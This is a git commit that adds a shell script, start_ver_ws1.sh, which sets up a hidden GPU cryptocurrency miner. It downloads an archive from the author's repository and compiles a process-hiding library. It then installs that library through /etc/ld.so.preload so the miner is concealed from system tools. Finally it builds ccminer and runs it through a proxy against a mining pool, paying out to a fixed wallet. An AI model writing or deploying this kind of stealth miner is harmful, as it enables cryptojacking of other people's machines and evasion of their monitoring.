a8a50bb3babd1879e0f3e172decd9908901e467d
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-28 19:03:30 +0200

    Create start_ver_ws1.sh

---
+++ start_ver_ws1.sh
@@ -0,0 +1,18 @@
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh
+apt update;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git;
+
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicCCm.zip
+unzip magicCCm.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+chmod +x ccminer/build.sh
+chmod +x ccminer/configure.sh
+chmod +x ccminer/autogen.sh
+cd ccminer
+./autogen.sh
+./build.sh
+graftcp ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RJG5nm96Axdhm1eQ4DbndhLq4JEPN3i7sW.Nvidia -p x
